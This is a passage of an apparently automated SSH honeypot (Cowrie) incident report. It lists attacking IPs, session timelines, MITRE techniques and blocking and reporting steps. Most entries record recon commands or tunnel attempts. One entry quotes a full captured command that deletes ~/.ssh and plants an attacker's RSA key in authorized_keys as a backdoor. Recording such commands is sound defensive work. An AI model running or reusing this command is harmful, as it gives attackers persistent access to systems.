| `2026-07-15 11:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]8` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b73a05e49d5f

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-15 11:57 |
| **Last Seen** | 2026-07-15 11:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:57:29` | `cowrie.session.connect` |
| `2026-07-15 11:57:29` | `cowrie.client.version` |
| `2026-07-15 11:57:29` | `cowrie.client.kex` |
| `2026-07-15 11:57:30` | `cowrie.login.success` |
| `2026-07-15 11:57:31` | `cowrie.session.params` |
| `2026-07-15 11:57:31` | `cowrie.command.input` |
| `2026-07-15 11:57:32` | `cowrie.log.closed` |
| `2026-07-15 11:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6542e7ba84a4

| Field | Detail |
|---|---|
| **Source IP** | `31.41.81[.]65` |
| **First Seen** | 2026-07-15 12:14 |
| **Last Seen** | 2026-07-15 12:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:14:15` | `cowrie.session.connect` |
| `2026-07-15 12:14:16` | `cowrie.client.version` |
| `2026-07-15 12:14:16` | `cowrie.client.kex` |
| `2026-07-15 12:14:17` | `cowrie.login.success` |
| `2026-07-15 12:14:17` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.41.81[.]65` to AbuseIPDB if not already reported
- [ ] Block `31.41.81[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82b78736dfaa

| Field | Detail |
|---|---|
| **Source IP** | `61.145.163[.]164` |
| **First Seen** | 2026-07-15 12:14 |
| **Last Seen** | 2026-07-15 12:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:14:23` | `cowrie.session.connect` |
| `2026-07-15 12:14:24` | `cowrie.client.version` |
| `2026-07-15 12:14:24` | `cowrie.client.kex` |
| `2026-07-15 12:14:27` | `cowrie.login.success` |
| `2026-07-15 12:14:28` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:14:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.163[.]164` to AbuseIPDB if not already reported
- [ ] Block `61.145.163[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93aba52fb057

| Field | Detail |
|---|---|
| **Source IP** | `90.173.78[.]90` |
| **First Seen** | 2026-07-15 12:15 |
| **Last Seen** | 2026-07-15 12:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:15:14` | `cowrie.session.connect` |
| `2026-07-15 12:15:14` | `cowrie.client.version` |
| `2026-07-15 12:15:14` | `cowrie.client.kex` |
| `2026-07-15 12:15:15` | `cowrie.login.success` |
| `2026-07-15 12:15:15` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:15:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.173.78[.]90` to AbuseIPDB if not already reported
- [ ] Block `90.173.78[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-615e418b4c87

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 12:16 |
| **Last Seen** | 2026-07-15 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:16:21` | `cowrie.session.connect` |
| `2026-07-15 12:16:21` | `cowrie.client.version` |
| `2026-07-15 12:16:21` | `cowrie.client.kex` |
| `2026-07-15 12:16:22` | `cowrie.login.success` |
| `2026-07-15 12:16:22` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:16:22` | `cowrie.direct-tcpip.data` |
| `2026-07-15 12:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e388af4bf57

| Field | Detail |
|---|---|
| **Source IP** | `89.203.142[.]96` |
| **First Seen** | 2026-07-15 12:17 |
| **Last Seen** | 2026-07-15 12:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:17:38` | `cowrie.session.connect` |
| `2026-07-15 12:17:39` | `cowrie.client.version` |
| `2026-07-15 12:17:39` | `cowrie.client.kex` |
| `2026-07-15 12:17:40` | `cowrie.login.success` |
| `2026-07-15 12:17:40` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.203.142[.]96` to AbuseIPDB if not already reported
- [ ] Block `89.203.142[.]96` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67e45b9f21f6

| Field | Detail |
|---|---|
| **Source IP** | `70.89.116[.]5` |
| **First Seen** | 2026-07-15 12:17 |
| **Last Seen** | 2026-07-15 12:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:17:45` | `cowrie.session.connect` |
| `2026-07-15 12:17:46` | `cowrie.client.version` |
| `2026-07-15 12:17:46` | `cowrie.client.kex` |
| `2026-07-15 12:17:47` | `cowrie.login.success` |
| `2026-07-15 12:17:48` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.89.116[.]5` to AbuseIPDB if not already reported
- [ ] Block `70.89.116[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c740570d318

| Field | Detail |
|---|---|
| **Source IP** | `110.227.213[.]163` |
| **First Seen** | 2026-07-15 12:18 |
| **Last Seen** | 2026-07-15 12:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:18:17` | `cowrie.session.connect` |
| `2026-07-15 12:18:17` | `cowrie.client.version` |
| `2026-07-15 12:18:17` | `cowrie.client.kex` |
| `2026-07-15 12:18:20` | `cowrie.login.success` |
| `2026-07-15 12:18:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:18:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.227.213[.]163` to AbuseIPDB if not already reported
- [ ] Block `110.227.213[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-858531657218

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 12:25 |
| **Last Seen** | 2026-07-15 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:25:39` | `cowrie.session.connect` |
| `2026-07-15 12:25:39` | `cowrie.client.version` |
| `2026-07-15 12:25:39` | `cowrie.client.kex` |
| `2026-07-15 12:25:40` | `cowrie.login.success` |
| `2026-07-15 12:25:40` | `cowrie.session.params` |
| `2026-07-15 12:25:40` | `cowrie.command.input` |
| `2026-07-15 12:25:41` | `cowrie.log.closed` |
| `2026-07-15 12:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-515b8051a13f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 12:31 |
| **Last Seen** | 2026-07-15 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:31:14` | `cowrie.session.connect` |
| `2026-07-15 12:31:14` | `cowrie.client.version` |
| `2026-07-15 12:31:14` | `cowrie.client.kex` |
| `2026-07-15 12:31:14` | `cowrie.login.success` |
| `2026-07-15 12:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ac12f07a5d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 12:31 |
| **Last Seen** | 2026-07-15 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:31:15` | `cowrie.session.connect` |
| `2026-07-15 12:31:15` | `cowrie.client.version` |
| `2026-07-15 12:31:15` | `cowrie.client.kex` |
| `2026-07-15 12:31:15` | `cowrie.login.success` |
| `2026-07-15 12:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0302973d02

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 12:31 |
| **Last Seen** | 2026-07-15 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:31:19` | `cowrie.session.connect` |
| `2026-07-15 12:31:19` | `cowrie.client.version` |
| `2026-07-15 12:31:19` | `cowrie.client.kex` |
| `2026-07-15 12:31:19` | `cowrie.login.success` |
| `2026-07-15 12:31:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be6b95a6fb10

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 12:31 |
| **Last Seen** | 2026-07-15 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:31:19` | `cowrie.session.connect` |
| `2026-07-15 12:31:19` | `cowrie.client.version` |
| `2026-07-15 12:31:19` | `cowrie.client.kex` |
| `2026-07-15 12:31:19` | `cowrie.login.success` |
| `2026-07-15 12:31:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf5129681cbb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 12:31 |
| **Last Seen** | 2026-07-15 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:31:20` | `cowrie.session.connect` |
| `2026-07-15 12:31:20` | `cowrie.client.version` |
| `2026-07-15 12:31:21` | `cowrie.client.kex` |
| `2026-07-15 12:31:21` | `cowrie.login.success` |
| `2026-07-15 12:31:21` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:31:21` | `cowrie.direct-tcpip.data` |
| `2026-07-15 12:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c9e501737e3

| Field | Detail |
|---|---|
| **Source IP** | `120.26.195[.]212` |
| **First Seen** | 2026-07-15 12:31 |
| **Last Seen** | 2026-07-15 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:31:35` | `cowrie.session.connect` |
| `2026-07-15 12:31:35` | `cowrie.client.version` |
| `2026-07-15 12:31:35` | `cowrie.client.kex` |
| `2026-07-15 12:31:36` | `cowrie.login.success` |
| `2026-07-15 12:31:37` | `cowrie.session.params` |
| `2026-07-15 12:31:37` | `cowrie.command.input` |
| `2026-07-15 12:31:37` | `cowrie.log.closed` |
| `2026-07-15 12:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.26.195[.]212` to AbuseIPDB if not already reported
- [ ] Block `120.26.195[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed47f2aa4f26

| Field | Detail |
|---|---|
| **Source IP** | `64.186.241[.]50` |
| **First Seen** | 2026-07-15 12:37 |
| **Last Seen** | 2026-07-15 12:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:37:49` | `cowrie.session.connect` |
| `2026-07-15 12:37:49` | `cowrie.client.version` |
| `2026-07-15 12:37:49` | `cowrie.client.kex` |
| `2026-07-15 12:37:49` | `cowrie.login.success` |
| `2026-07-15 12:37:50` | `cowrie.session.params` |
| `2026-07-15 12:37:50` | `cowrie.command.input` |
| `2026-07-15 12:37:50` | `cowrie.command.failed` |
| `2026-07-15 12:37:50` | `cowrie.log.closed` |
| `2026-07-15 12:37:50` | `cowrie.session.params` |
| `2026-07-15 12:37:50` | `cowrie.command.input` |
| `2026-07-15 12:37:50` | `cowrie.session.file_download` |
| `2026-07-15 12:37:50` | `cowrie.log.closed` |
| `2026-07-15 12:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.186.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `64.186.241[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d2f1b328452

| Field | Detail |
|---|---|
| **Source IP** | `64.186.241[.]50` |
| **First Seen** | 2026-07-15 12:37 |
| **Last Seen** | 2026-07-15 12:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:37:50` | `cowrie.session.connect` |
| `2026-07-15 12:37:51` | `cowrie.client.version` |
| `2026-07-15 12:37:51` | `cowrie.client.kex` |
| `2026-07-15 12:37:51` | `cowrie.login.success` |
| `2026-07-15 12:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.186.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `64.186.241[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2f11e25437d

| Field | Detail |
|---|---|
| **Source IP** | `64.186.241[.]50` |
| **First Seen** | 2026-07-15 12:37 |
| **Last Seen** | 2026-07-15 12:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:37:51` | `cowrie.session.connect` |
| `2026-07-15 12:37:51` | `cowrie.client.version` |
| `2026-07-15 12:37:51` | `cowrie.client.kex` |
| `2026-07-15 12:37:51` | `cowrie.login.success` |
| `2026-07-15 12:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.186.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `64.186.241[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b29a1bd01a01

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-15 12:40 |
| **Last Seen** | 2026-07-15 12:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:40:00` | `cowrie.session.connect` |
| `2026-07-15 12:40:00` | `cowrie.client.version` |
| `2026-07-15 12:40:00` | `cowrie.client.kex` |
| `2026-07-15 12:40:00` | `cowrie.login.success` |
| `2026-07-15 12:40:00` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:40:00` | `cowrie.direct-tcpip.ja4` |
| `2026-07-15 12:40:00` | `cowrie.direct-tcpip.data` |
| `2026-07-15 12:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5a02b585fb4

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]73` |
| **First Seen** | 2026-07-15 12:41 |
| **Last Seen** | 2026-07-15 12:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:41:02` | `cowrie.session.connect` |
| `2026-07-15 12:41:02` | `cowrie.client.version` |
| `2026-07-15 12:41:02` | `cowrie.client.kex` |
| `2026-07-15 12:41:05` | `cowrie.login.success` |
| `2026-07-15 12:41:05` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]73` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-734da3e341c7

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]146` |
| **First Seen** | 2026-07-15 12:41 |
| **Last Seen** | 2026-07-15 12:46 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:41:11` | `cowrie.session.connect` |
| `2026-07-15 12:41:11` | `cowrie.client.version` |
| `2026-07-15 12:41:11` | `cowrie.client.kex` |
| `2026-07-15 12:41:12` | `cowrie.login.success` |
| `2026-07-15 12:41:13` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bec3b3d9fc86

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 12:43 |
| **Last Seen** | 2026-07-15 12:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:43:01` | `cowrie.session.connect` |
| `2026-07-15 12:43:02` | `cowrie.client.version` |
| `2026-07-15 12:43:02` | `cowrie.client.kex` |
| `2026-07-15 12:43:03` | `cowrie.login.success` |
| `2026-07-15 12:43:04` | `cowrie.session.params` |
| `2026-07-15 12:43:04` | `cowrie.command.input` |
| `2026-07-15 12:43:04` | `cowrie.log.closed` |
| `2026-07-15 12:43:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a705b7759874

| Field | Detail |
|---|---|
| **Source IP** | `122.170.111[.]140` |
| **First Seen** | 2026-07-15 12:43 |
| **Last Seen** | 2026-07-15 12:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:43:27` | `cowrie.session.connect` |
| `2026-07-15 12:43:28` | `cowrie.client.version` |
| `2026-07-15 12:43:28` | `cowrie.client.kex` |
| `2026-07-15 12:43:30` | `cowrie.login.success` |
| `2026-07-15 12:43:31` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.111[.]140` to AbuseIPDB if not already reported
- [ ] Block `122.170.111[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fefff48617a

| Field | Detail |
|---|---|
| **Source IP** | `87.117.32[.]22` |
| **First Seen** | 2026-07-15 12:43 |
| **Last Seen** | 2026-07-15 12:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:43:36` | `cowrie.session.connect` |
| `2026-07-15 12:43:37` | `cowrie.client.version` |
| `2026-07-15 12:43:37` | `cowrie.client.kex` |
| `2026-07-15 12:43:38` | `cowrie.login.success` |
| `2026-07-15 12:43:39` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.117.32[.]22` to AbuseIPDB if not already reported
- [ ] Block `87.117.32[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-488721589b16

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-15 12:43 |
| **Last Seen** | 2026-07-15 12:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:43:53` | `cowrie.session.connect` |
| `2026-07-15 12:43:53` | `cowrie.client.version` |
| `2026-07-15 12:43:53` | `cowrie.client.kex` |
| `2026-07-15 12:43:54` | `cowrie.login.success` |
| `2026-07-15 12:43:57` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:43:57` | `cowrie.direct-tcpip.ja4` |
| `2026-07-15 12:43:57` | `cowrie.direct-tcpip.data` |
| `2026-07-15 12:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5037c9f5240c

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
